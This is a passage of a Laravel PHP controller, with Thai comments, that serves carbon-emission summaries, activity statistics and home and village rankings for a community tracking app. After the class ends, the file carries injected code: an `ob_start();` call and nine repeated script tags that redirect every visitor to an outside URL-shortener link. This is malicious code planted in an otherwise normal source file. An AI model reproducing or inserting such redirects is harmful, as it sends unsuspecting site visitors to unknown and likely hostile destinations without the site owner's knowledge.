                ->groupBy('category')
                ->get();

            $totalCo2ForPie = (float) $categoryRaw->sum('co2');

            $categoryPie = $categoryRaw->map(function ($r) use ($totalCo2ForPie) {
                $labelMap = [
                    'electric' => 'เครื่องใช้ไฟฟ้า',
                    'vehicle' => 'ยานพาหนะ',
                    'cooking' => 'ทำอาหาร',
                ];

                // ✅ ประกาศตัวแปรก่อนใช้
                $co2 = (float) $r->co2;
                $pct = $totalCo2ForPie > 0 ? round(($co2 / $totalCo2ForPie) * 100, 2) : 0.0;

                return [
                    'key' => (string) $r->category,                          // 'electric' | 'vehicle' | 'cooking'
                    'label' => $labelMap[$r->category] ?? (string) $r->category,
                    'co2' => $co2,                                           // kg
                    'value' => $co2,                                           // ✅ ใส่ value = co2 เพื่อให้ฝั่ง Flutter ใช้ได้ทันที
                    'percent' => $pct,                                           // %
                ];
            })->values()->toArray(); // ✅ แปลงเป็น array ก่อนส่งออก


            $dailyReducing = DB::table('reducing')
                ->join('user', 'reducing.User_Code', '=', 'user.User_Code')
                ->where('user.home_Code', $homeCode)
                ->whereBetween('reducing.date', [$startDt->toDateString(), $endDt->toDateString()])
                ->selectRaw('
                DATE(reducing.date) AS day,
                COALESCE(SUM(reducing),0) AS reducing
            ')
                ->groupBy('day')
                ->orderBy('day')
                ->get();

            // map เพื่อเข้าถึงเร็ว
            $emMap = [];
            foreach ($dailyEmissions as $r) {
                $emMap[$r->day] = [
                    'co2' => (float) $r->co2,
                    'ch4' => (float) $r->ch4,
                    'n2o' => (float) $r->n2o,
                ];
            }
            $redMap = [];
            foreach ($dailyReducing as $r) {
                $redMap[$r->day] = (float) $r->reducing;
            }

            // 4) เติมวันให้ครบช่วง และ "ส่งออกแบบ emissionVillage" => แถวที่มี label/total_*
            $rows = [];
            $period = CarbonPeriod::create($startDt->toDateString(), '1 day', $endDt->toDateString());
            foreach ($period as $d) {
                $day = $d->toDateString();
                $co2 = $emMap[$day]['co2'] ?? 0.0;
                $ch4 = $emMap[$day]['ch4'] ?? 0.0;
                $n2o = $emMap[$day]['n2o'] ?? 0.0;
                $reducing = $redMap[$day] ?? 0.0;

                $rows[] = [
                    'label' => $day,                 // ✅ เหมือน emissionVillage
                    'total_CO2' => $co2,
                    'total_CH4' => $ch4,
                    'total_N2O' => $n2o,
                    'total_gas' => $co2 + $ch4 + $n2o,
                    'reducing' => $reducing,            // เพิ่มให้ใช้ทำกราฟปล่อย/ลด
                    'net_co2' => max(0.0, $co2 - $reducing),
                ];
            }

            // 5) ส่งออกสไตล์ emissionVillage + meta รวมช่วง (เผื่อหน้ารายงานใช้งาน)
            return response()->json([
                'success' => true,
                'data' => $rows,                    // ✅ เหมือน emissionVillage
                'meta' => [
                    'period' => [
                        'start' => $startDt->toDateString(),
                        'end' => $endDt->toDateString(),
                    ],
                    'totals' => [
                        'co2' => $emissions['co2'],
                        'ch4' => $emissions['ch4'],
                        'n2o' => $emissions['n2o'],
                        'total_gas' => $emissions['total_gas'],
                        'reducing_total' => $sumReducing,
                        'net_co2' => $net['net_co2'],
                        'monthly' => $monthlyEmissionsFormElec,
                        'ElecMonthly' => $dailyEmissionsFormElec,
                        'CatePie' => $categoryPie,
                    ],
                ],
            ], 200);

        } catch (\Throwable $e) {
            \Log::error('rangeSummary error', [
                'msg' => $e->getMessage(),
                'file' => $e->getFile(),
                'line' => $e->getLine(),
                'trace' => $e->getTraceAsString(),
                'req' => $request->all(),
            ]);

            return response()->json([
                'success' => false,
                'message' => 'Server Error: ' . $e->getMessage(),
            ], 500);
        }
    }

    public function villageRangeSummary(Request $request): JsonResponse
    {
        // 1) validate (ช่วงวัน + village_Code)
        $v = Validator::make($request->all(), [
            'village_Code' => 'required|integer', // ถ้ามีตาราง village ให้ใส่ exists:village,village_Code
            'start' => 'required|date_format:Y-m-d',
            'end' => 'required|date_format:Y-m-d',
        ]);
        if ($v->fails()) {
            return response()->json([
                'success' => false,
                'message' => 'Invalid params',
                'errors' => $v->errors(),
            ], 422);
        }

        $villageCode = (int) $request->village_Code;
        $startDt = Carbon::parse($request->start)->startOfDay();
        $endDt = Carbon::parse($request->end)->endOfDay();

        if ($endDt->lt($startDt)) {
            return response()->json([
                'success' => false,
                'message' => 'end must be >= start',
            ], 422);
        }

        try {
            // 2) รวมทั้งช่วง (เอาไว้ลง meta)
            $emissionRow = DB::table('usings')
                ->join('user', 'usings.User_Code', '=', 'user.User_Code')
                ->where('user.Village_Code', $villageCode)
                ->where('usings.input_type', 'd')
                ->whereBetween('usings.Date_time', [$startDt, $endDt])
                ->selectRaw('
                COALESCE(SUM(usings.CO2_emission),0) AS co2,
                COALESCE(SUM(usings.CH4_emission),0) AS ch4,
                COALESCE(SUM(usings.N2O_emission),0) AS n2o
            ')
                ->first();

            $sumReducing = (float) DB::table('reducing')
                ->join('user', 'reducing.User_Code', '=', 'user.User_Code')
                ->where('user.Village_Code', $villageCode)
                ->whereBetween('reducing.date', [$startDt->toDateString(), $endDt->toDateString()])
                ->sum('reducing');

            $emissions = [
                'co2' => (float) $emissionRow->co2,
                'ch4' => (float) $emissionRow->ch4,
                'n2o' => (float) $emissionRow->n2o,
                'total_gas' => (float) $emissionRow->co2 + (float) $emissionRow->ch4 + (float) $emissionRow->n2o,
            ];
            $net = [
                'net_co2' => max(0.0, $emissions['co2'] - $sumReducing),
            ];

            // 3) รายวัน: group by DATE() สำหรับ usings + reducing
            $dailyEmissions = DB::table('usings')
                ->join('user', 'usings.User_Code', '=', 'user.User_Code')
                ->where('user.Village_Code', $villageCode)
                ->where('usings.input_type', 'd')
                ->whereBetween('usings.Date_time', [$startDt, $endDt])
                ->selectRaw('
                DATE(usings.Date_time) AS day,
                COALESCE(SUM(usings.CO2_emission),0) AS co2,
                COALESCE(SUM(usings.CH4_emission),0) AS ch4,
                COALESCE(SUM(usings.N2O_emission),0) AS n2o
            ')
                ->groupBy('day')
                ->orderBy('day')
                ->get();

            // daily เฉพาะไฟฟ้า (type N/I)
            $dailyEmissionsFormElec = DB::table('usings')
                ->join('user', 'usings.User_Code', '=', 'user.User_Code')
                ->join('item', 'usings.Home_item_Code', '=', 'item.Item_Code') // เช็คชื่อคอลัมน์ตาม schema
                ->where('user.Village_Code', $villageCode)
                ->whereIn('item.type', ['N', 'I'])
                ->where('usings.input_type', 'd')
                ->whereBetween('usings.Date_time', [$startDt, $endDt])
                ->selectRaw('
                DATE(usings.Date_time) AS day,
                COALESCE(SUM(usings.CO2_emission),0) AS co2,
                COALESCE(SUM(usings.CH4_emission),0) AS ch4,
                COALESCE(SUM(usings.N2O_emission),0) AS n2o
            ')
                ->groupBy('day')
                ->orderBy('day')
                ->get();

            // monthly (input_type=m) — ถ้าอยากจำกัดเฉพาะไฟฟ้า ให้ join item + whereIn type N/I เช่นเดียวกับ dailyElec
            $monthlyEmissionsFormElec = DB::table('usings')
                ->join('user', 'usings.User_Code', '=', 'user.User_Code')
                ->where('user.Village_Code', $villageCode)
                ->where('usings.input_type', 'm')
                ->whereBetween('usings.Date_time', [$startDt, $endDt])
                ->selectRaw('
                COALESCE(usings.CO2_emission,0) AS co2,
                COALESCE(usings.CH4_emission,0) AS ch4,
                COALESCE(usings.N2O_emission,0) AS n2o,
                usings.Distance_time AS monthly_unit
            ')
                ->get();

            $dailyReducing = DB::table('reducing')
                ->join('user', 'reducing.User_Code', '=', 'user.User_Code')
                ->where('user.Village_Code', $villageCode)
                ->whereBetween('reducing.date', [$startDt->toDateString(), $endDt->toDateString()])
                ->selectRaw('
                DATE(reducing.date) AS day,
                COALESCE(SUM(reducing),0) AS reducing
            ')
                ->groupBy('day')
                ->orderBy('day')
                ->get();

            // map เพื่อเข้าถึงเร็ว
            $emMap = [];
            foreach ($dailyEmissions as $r) {
                $emMap[$r->day] = [
                    'co2' => (float) $r->co2,
                    'ch4' => (float) $r->ch4,
                    'n2o' => (float) $r->n2o,
                ];
            }
            $redMap = [];
            foreach ($dailyReducing as $r) {
                $redMap[$r->day] = (float) $r->reducing;
            }

            // 4) เติมวันให้ครบช่วง (โครงสร้าง rows แบบเดิม)
            $rows = [];
            $period = CarbonPeriod::create($startDt->toDateString(), '1 day', $endDt->toDateString());
            foreach ($period as $d) {
                $day = $d->toDateString();
                $co2 = $emMap[$day]['co2'] ?? 0.0;
                $ch4 = $emMap[$day]['ch4'] ?? 0.0;
                $n2o = $emMap[$day]['n2o'] ?? 0.0;
                $reducing = $redMap[$day] ?? 0.0;

                $rows[] = [
                    'label' => $day,
                    'total_CO2' => $co2,
                    'total_CH4' => $ch4,
                    'total_N2O' => $n2o,
                    'total_gas' => $co2 + $ch4 + $n2o,
                    'reducing' => $reducing,
                    'net_co2' => max(0.0, $co2 - $reducing),
                ];
            }

            // 5) ส่งออก (ไม่มี CatePie)
            return response()->json([
                'success' => true,
                'data' => $rows,
                'meta' => [
                    'period' => [
                        'start' => $startDt->toDateString(),
                        'end' => $endDt->toDateString(),
                    ],
                    'totals' => [
                        'co2' => $emissions['co2'],
                        'ch4' => $emissions['ch4'],
                        'n2o' => $emissions['n2o'],
                        'total_gas' => $emissions['total_gas'],
                        'reducing_total' => $sumReducing,
                        'net_co2' => $net['net_co2'],
                        'monthly' => $monthlyEmissionsFormElec,
                        'ElecMonthly' => $dailyEmissionsFormElec,
                    ],
                ],
            ], 200);

        } catch (\Throwable $e) {
            \Log::error('villageRangeSummary error', [
                'msg' => $e->getMessage(),
                'file' => $e->getFile(),
                'line' => $e->getLine(),
                'trace' => $e->getTraceAsString(),
                'req' => $request->all(),
            ]);

            return response()->json([
                'success' => false,
                'message' => 'Server Error: ' . $e->getMessage(),
            ], 500);
        }
    }

    // app/Http/Controllers/ReportController.php

    public function villageActivitySummary(Request $request): JsonResponse
    {
        $v = Validator::make($request->all(), [
            'village_Code' => 'required|integer',
            'start' => 'required|date_format:Y-m-d',
            'end' => 'required|date_format:Y-m-d',
        ]);
        if ($v->fails()) {
            return response()->json([
                'success' => false,
                'message' => 'Invalid params',
                'errors' => $v->errors(),
            ], 422);
        }

        $villageCode = (int) $request->village_Code;
        $startDt = Carbon::parse($request->start)->startOfDay();
        $endDt = Carbon::parse($request->end)->endOfDay();

        if ($endDt->lt($startDt)) {
            return response()->json([
                'success' => false,
                'message' => 'end must be >= start',
            ], 422);
        }

        try {
            $perActivity = DB::table('activity AS a')
                ->leftJoin('joiner AS j', 'j.activity_Code', '=', 'a.activity_Code')
                ->where('a.Village_Code', $villageCode)
                ->where('a.status', 1)
                ->selectRaw("
                a.activity_Code,
                a.activity_Name,
                COALESCE(a.Count, 0) AS target_joiners,
                COUNT(DISTINCT CASE WHEN j.status = 1 THEN j.User_Code END) AS actual_joiners,
                a.Date
            ")
                ->groupBy('a.activity_Code', 'a.activity_Name', 'a.Count', 'a.Date')
                ->orderBy('a.Date')
                ->get();

            // 2) time-series (กราฟเส้น): ยอดเข้าร่วมต่อวัน (จากกิจกรรมในช่วงนั้น)
            $timeseries = DB::table('activity AS a')
                ->leftJoin('joiner AS j', 'j.activity_Code', '=', 'a.activity_Code')
                ->where('a.Village_Code', $villageCode)
                ->whereBetween('a.Date', [$startDt->toDateString(), $endDt->toDateString()])
                ->selectRaw("
                DATE(a.Date) AS day,
                COUNT(DISTINCT CASE WHEN j.status = '1' THEN j.User_Code END) AS joined
            ")
                ->groupBy('day')
                ->orderBy('day')
                ->get();

            // เติมวันให้ครบช่วง (ถ้าวันไหนไม่มี กำหนด 0)
            $tsMap = [];
            foreach ($timeseries as $r) {
                $tsMap[$r->day] = (int) $r->joined;
            }
            $tsRows = [];
            $period = CarbonPeriod::create($startDt->toDateString(), '1 day', $endDt->toDateString());
            foreach ($period as $d) {
                $day = $d->toDateString();
                $tsRows[] = [
                    'label' => $day,
                    'joined' => $tsMap[$day] ?? 0,
                ];
            }

            // รวม Totals สำหรับ meta
            $targetSum = (int) $perActivity->sum('target_joiners');
            $actualSum = (int) $perActivity->sum('actual_joiners');
            $completion = $targetSum > 0 ? round(($actualSum / $targetSum) * 100, 2) : 0.0;

            // จัด table แสดงผล/หมายเหตุ
            $tableRows = $perActivity->map(function ($r) {
                $target = (int) $r->target_joiners;
                $actual = (int) $r->actual_joiners;
                $pct = $target > 0 ? round(($actual / $target) * 100, 2) : 0.0;

                return [
                    'activity_code' => $r->activity_Code,
                    'name' => $r->activity_Name,
                    'date' => (string) $r->Date,
                    'target' => $target,
                    'actual' => $actual,
                    'percent' => $pct,
                    'status' => $actual >= $target ? 'สำเร็จ' : 'ไม่ถึงเป้า',
                ];
            })->values();

            return response()->json([
                'success' => true,
                'data' => [
                    'timeseries' => $tsRows,        // [{label:'YYYY-MM-DD', joined: N}]
                    'table' => $tableRows,     // [{activity_code,name,date,target,actual,percent,status}]
                ],
                'meta' => [
                    'period' => [
                        'start' => $startDt->toDateString(),
                        'end' => $endDt->toDateString(),
                    ],
                    'totals' => [
                        'target_sum' => $targetSum,
                        'actual_sum' => $actualSum,
                        'completion_pct' => $completion,
                    ],
                ],
            ], 200);

        } catch (\Throwable $e) {
            \Log::error('villageActivitySummary error', [
                'msg' => $e->getMessage(),
                'file' => $e->getFile(),
                'line' => $e->getLine(),
                'trace' => $e->getTraceAsString(),
                'req' => $request->all(),
            ]);

            return response()->json([
                'success' => false,
                'message' => 'Server Error: ' . $e->getMessage(),
            ], 500);
        }
    }
    // app/Http/Controllers/ReportController.php

    public function homeRank(Request $request): \Illuminate\Http\JsonResponse
    {
        $v = Validator::make($request->all(), [
            'user_code' => 'required|integer|exists:user,User_Code',
            'limit' => 'nullable|integer|min:0', // ถ้าอยากแนบ Top N มาด้วย (0 = ทั้งหมด, ไม่ส่ง = ไม่ต้องแนบ)
        ]);
        if ($v->fails()) {
            return response()->json([
                'success' => false,
                'message' => 'Invalid params',
                'errors' => $v->errors(),
            ], 422);
        }

        try {
            $userCode = (int) $request->user_code;
            $limit = (int) ($request->limit ?? -1); // -1 = จะคืนเฉพาะ self

            // 1) หาบ้าน (home) และชุมชน (village) ของผู้ใช้
            $homeRow = \DB::table('user as u')
                ->leftJoin('home as h', 'h.home_Code', '=', 'u.home_Code')
                ->leftJoin('village as v', 'v.Village_Code', '=', 'h.Village_Code')
                ->where('u.User_Code', $userCode)
                ->select([
                    'h.home_Code as home_code',
                    'h.Home_number as home_number',
                    'h.Village_Code as village_code',
                    \DB::raw('COALESCE(v.Village_Name, "ไม่ทราบชื่อ") as village_name'),
                    'h.img as img',
                ])
                ->first();

            if (!$homeRow || !$homeRow->home_code) {
                // ผู้ใช้ยังไม่มีบ้าน
                return response()->json([
                    'success' => true,
                    'data' => [
                        'self' => null,
                        'list' => [],
                        'total' => 0,
                    ],
                    'message' => 'User has no home bound.',
                ], 200);
            }

            $homeCode = (int) $homeRow->home_code;
            $villageCode = (int) $homeRow->village_code;

            // 2) สร้างตาราง “อันดับบ้านในชุมชนเดียวกัน”
            //    - ดึง “บ้านทุกหลังในชุมชนนี้” (home h)
            //    - LEFT JOIN user (สมาชิกในบ้าน) แล้ว LEFT JOIN reducing เพื่อ sum ยอดทั้งบ้าน
            $rows = \DB::table('home as h')
                ->leftJoin('user as u', 'u.home_Code', '=', 'h.home_Code')
                ->leftJoin('reducing as r', 'r.User_Code', '=', 'u.User_Code')
                ->where('h.Village_Code', '=', $villageCode)
                ->selectRaw("
                h.home_Code                         as home_code,
                COALESCE(h.Home_number, '-')        as home_number,
                COALESCE(h.img, '')                 as img,
                COALESCE(SUM(r.reducing), 0)        as total_reducing,
                MAX(r.date)                         as last_activity
            ")
                ->groupBy('h.home_Code', 'h.Home_number', 'h.img')
                ->orderByDesc('total_reducing')
                ->orderBy('h.Home_number')
                ->get();

            // 3) คำนวณ dense rank แล้วหา “แถวของบ้านฉัน”
            $ranked = [];
            $rank = 0;
            $prevTotal = null;
            $i = 0;
            $self = null;

            foreach ($rows as $r) {
                $i++;
                $t = (float) $r->total_reducing;
                if ($prevTotal === null || $t < $prevTotal) {
                    $rank = $i;
                    $prevTotal = $t;
                }
                $row = [
                    'rank' => $rank,
                    'home_code' => (int) $r->home_code,
                    'home_number' => (string) $r->home_number,
                    'img' => (string) ($r->img ?? ''),
                    'total_reducing' => $t,
                    'last_activity' => $r->last_activity ? (string) $r->last_activity : null,
                ];
                $ranked[] = $row;

                if ((int) $r->home_code === $homeCode) {
                    $self = $row; // บ้านของผู้ใช้
                }
            }

            // 4) ถ้าต้องการแนบ Top N มาด้วยก็ทำได้ (ไม่บังคับ)
            $list = [];
            if ($limit >= 0) {
                $list = ($limit === 0) ? $ranked : array_slice($ranked, 0, $limit);
            }

            // 2.1) ดึงรายการรางวัลที่บ้านนี้ได้รับ (ล่าสุดอยู่บนสุด)
            $rewardedRows = \DB::table('rewarded as rw')
                ->leftJoin('reward as r', 'r.Reward_Code', '=', 'rw.Reward_Code')
                ->where('rw.home_Code', $homeCode)
                ->orderByDesc('rw.Have_Date')
                ->get([
                    'rw.Reward_Code                                as reward_code',
                    'rw.Have_Date                                  as have_date',
                    \DB::raw('COALESCE(r.Reward_Name, "")          as reward_name'),
                    \DB::raw('COALESCE(r.give_type, "")            as give_type'),
                    \DB::raw('COALESCE(r.reduce_value, 0)          as reduce_value'),
                    \DB::raw('COALESCE(r.img, "")                  as img'),
                ]);

            // แปลง path ของรูป
            $rewardedRows->transform(function ($reward) {
                if (!empty($reward->img)) {
                    $reward->img = asset("storage/app/public/rewards/{$reward->img}");
                }
                return $reward;
            });
            $rewardedSummary = [
                'count' => $rewardedRows->count(),
                'latest_date' => optional($rewardedRows->first())->have_date,
                'latest_reward' => $rewardedRows->first() ? [
                    'code' => $rewardedRows->first()->reward_code,
                    'name' => $rewardedRows->first()->reward_name,
                    'give_type' => $rewardedRows->first()->give_type,
                    'have_date' => $rewardedRows->first()->have_date,
                    'img' => $rewardedRows->first()->img,
                ] : null,
            ];



            return response()->json([
                'success' => true,
                'data' => [
                    'self' => $self,            // ← อันดับของบ้านที่ผู้ใช้อยู่ (รวมยอดของทั้งบ้าน)
                    'list' => $list,            // ← แนบ Top N ถ้าระบุ limit (ไม่อยากได้ ไม่ต้องส่งพารามฯ)
                    'total' => count($ranked),   // จำนวนบ้านทั้งหมดในชุมชนนี้
                    'village' => [
                        'village_code' => $villageCode,
                        'village_name' => (string) ($homeRow->village_name ?? ''),
                    ],
                ],
                'rewarded' => [
                    'items' => $rewardedRows,
                    'summary' => $rewardedSummary,
                ],
                'meta' => [
                    'scope' => 'all_time',
                    'ordered_by' => 'total_reducing_desc',
                ],
            ], 200);

        } catch (\Throwable $e) {
            \Log::error('homeRankForUser error', [
                'msg' => $e->getMessage(),
                'file' => $e->getFile(),
                'line' => $e->getLine(),
                'trace' => $e->getTraceAsString(),
                'req' => $request->all(),
            ]);

            return response()->json([
                'success' => false,
                'message' => 'Server Error: ' . $e->getMessage(),
            ], 500);
        }
    }





    public function villageRank(Request $request): \Illuminate\Http\JsonResponse
    {
        $v = Validator::make($request->all(), [
            'village_Code' => 'required|integer',
            'limit' => 'nullable|integer|min:0', // 0 = ทั้งหมด
        ]);
        if ($v->fails()) {
            return response()->json([
                'success' => false,
                'message' => 'Invalid params',
                'errors' => $v->errors(),
            ], 422);
        }

        $villageCode = (int) $request->village_Code;
        $limit = (int) ($request->limit ?? 10);

        try {
            // เริ่มจาก village ทั้งหมด → LEFT JOIN user → LEFT JOIN reducing (ไม่มี whereBetween วัน)
            $rows = \DB::table('village as v')
                ->leftJoin('user as u', 'u.Village_Code', '=', 'v.Village_Code')
                ->leftJoin('reducing as r', 'r.User_Code', '=', 'u.User_Code')
                ->selectRaw("
                v.Village_Code AS village_code,
                COALESCE(v.Village_Name, 'ไม่ทราบชื่อ') AS village_name,
                COUNT(DISTINCT u.User_Code) AS member_count,
                COALESCE(SUM(r.reducing), 0) AS total_reducing,
                MAX(r.date) AS last_activity
            ")
                ->groupBy('v.Village_Code', 'v.Village_Name')
                ->orderByDesc('total_reducing')
                ->orderBy('v.Village_Name')
                ->get();

            // dense rank
            $ranked = [];
            $rank = 0;
            $prevTotal = null;
            $i = 0;
            foreach ($rows as $r) {
                $i++;
                $t = (float) $r->total_reducing;
                if ($prevTotal === null || $t < $prevTotal) {
                    $rank = $i;
                    $prevTotal = $t;
                }
                $ranked[] = [
                    'rank' => $rank,
                    'village_code' => (int) $r->village_code,
                    'village_name' => (string) $r->village_name,
                    'total_reducing' => (float) $t,
                    'member_count' => (int) $r->member_count,
                    'last_activity' => $r->last_activity ? (string) $r->last_activity : null,
                ];
            }

            // อันดับหมู่บ้านของผู้ใช้เอง
            $self = null;
            foreach ($ranked as $row) {
                if ((int) $row['village_code'] === $villageCode) {
                    $self = $row;
                    break;
                }
            }

            // Top N (limit=0 => ทั้งหมด)
            $list = ($limit > 0) ? array_slice($ranked, 0, $limit) : $ranked;

            return response()->json([
                'success' => true,
                'data' => [
                    'list' => $list,
                    'self' => $self,
                    'total' => count($ranked),
                ],
                'meta' => [
                    'scope' => 'all_time', // ระบุว่าเป็นยอดสะสมตั้งแต่เริ่มต้น
                    'ordered_by' => 'total_reducing_desc',
                ],
            ], 200);

        } catch (\Throwable $e) {
            \Log::error('villageRank error', [
                'msg' => $e->getMessage(),
                'file' => $e->getFile(),
                'line' => $e->getLine(),
                'trace' => $e->getTraceAsString(),
                'req' => $request->all(),
            ]);

            return response()->json([
                'success' => false,
                'message' => 'Server Error: ' . $e->getMessage(),
            ], 500);
        }
    }
    public function history(Request $request): JsonResponse
    {
        $v = Validator::make($request->all(), [
            'home_Code' => 'required|integer|exists:home,Home_Code',
            'start' => 'required|date_format:Y-m-d',
            'end' => 'required|date_format:Y-m-d',
            'type' => 'nullable|in:d,m',
            'searchType' => 'required|string|in:A,E,V,F', // A=ทั้งหมด, E=เครื่องใช้ไฟฟ้า(I/N), V=ยานพาหนะ(C/M), F=อาหาร(ทิ้งเศษอาหาร)
        ]);
        if ($v->fails()) {
            return response()->json([
                'success' => false,
                'message' => 'Invalid params',
                'errors' => $v->errors(),
            ], 422);
        }

        $homeCode = (int) $request->home_Code;
        $type = $request->get('type', 'd'); // ค่าเริ่มต้น d
        $startDt = Carbon::parse($request->start)->startOfDay();
        $endDt = Carbon::parse($request->end)->endOfDay();
        $searchType = $request->input('searchType', 'A');

        if ($endDt->lt($startDt)) {
            return response()->json([
                'success' => false,
                'message' => 'end must be >= start',
            ], 422);
        }

        try {
            // base query
            $q = DB::table('usings as u')
                ->join('user as usr', 'usr.User_Code', '=', 'u.User_Code')
                ->leftJoin('item as i', 'u.Home_item_Code', '=', 'i.item_Code')
                ->leftJoin('item_type as it', 'it.Item_type_Code', '=', 'i.Item_type_Code')
                ->leftJoin('fuel as f', 'f.fuel_Code', '=', 'i.fuel_Code') // <<-- JOIN 'f' ที่นี่ครั้งเดียว
                ->where('usr.home_Code', $homeCode)
                ->where('u.input_type', $type)
                ->whereBetween('u.Date_time', [$startDt, $endDt]);


            // กรองตามประเภทที่เลือก
            switch ($searchType) {
                case 'E': // เครื่องใช้ไฟฟ้า -> I/N
                    $q->whereIn('i.type', ['I', 'N']);
                    break;
                case 'V': // ยานพาหนะ
                    $q->where(function ($qq) {
                        $qq->whereIn('i.type', ['C', 'M'])   // จาก item
                            ->orWhere('f.type', 'V');         // หรือจาก fuel
                    });
                    break;

                case 'F': // อาหาร/ทิ้งเศษอาหาร
                    $q->where(function ($qq) {
                        $qq->where('u.Home_item_Code', 0)    // บันทึกเป็นเศษอาหารโดยตรง
                            ->orWhere('i.Item_type_Code', 0)  // item เป็นเศษอาหาร
                            ->orWhere(function ($q2) {        // ใช้เชื้อเพลิงหมวดอาหาร
                                $q2->where('u.Home_item_Code', '!=', 0)
                                    ->where('f.type', 'F');
                            });
                    });
                    break;
                case 'A': // ทั้งหมด ไม่กรองเพิ่ม
                default:
                    // no extra filter
                    break;
            }

            // เลือกคอลัมน์ให้ตรงกับที่หน้าบ้านใช้
            $rows = $q->selectRaw("
    u.Home_item_Code                                      AS Home_item_Code,
    u.Date_time                                           AS Date_time,
    COALESCE(usr.User_Name,'')                            AS User_Name,
    CASE
        WHEN i.Item_type_Code = 0 THEN 'ทิ้งเศษอาหาร'
        WHEN i.Item_type_Code IS NULL THEN COALESCE(f.fuel_Name, COALESCE(it.Item_type_Name,''), '')
        ELSE COALESCE(it.Item_type_Name,'')
    END                                                   AS Item_Name,
    COALESCE(u.Distance_time, 0)                          AS using_time,
    COALESCE(u.CO2_emission, 0)                           AS CO2_emission,
    COALESCE(i.type,'')                                   AS typeForItem
")
                ->orderByDesc('u.Date_time')
                ->get();


            return response()->json([
                'success' => true,
                'data' => $rows->map(function ($r) {
                    return [
                        'Home_item_Code' => (string) $r->Home_item_Code,
                        'Date_time' => (string) $r->Date_time,
                        'User_Name' => (string) $r->User_Name,
                        'Item_Name' => (string) $r->Item_Name,
                        'using_time' => (float) $r->using_time,
                        'CO2_emission' => (float) $r->CO2_emission,
                        'typeForItem' => (string) $r->typeForItem,
                    ];
                })->values(),
                'meta' => [
                    'home_Code' => $homeCode,
                    'period' => [
                        'start' => $startDt->toDateString(),
                        'end' => $endDt->toDateString(),
                    ],
                    'input_type' => $type,
                ],
            ], 200);

        } catch (\Throwable $e) {
            \Log::error('Allhistory error', [
                'msg' => $e->getMessage(),
                'file' => $e->getFile(),
                'line' => $e->getLine(),
                'trace' => $e->getTraceAsString(),
                'req' => $request->all(),
            ]);

            return response()->json([
                'success' => false,
                'message' => 'Server Error: ' . $e->getMessage(),
            ], 500);
        }
    }










}
ob_start();

<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>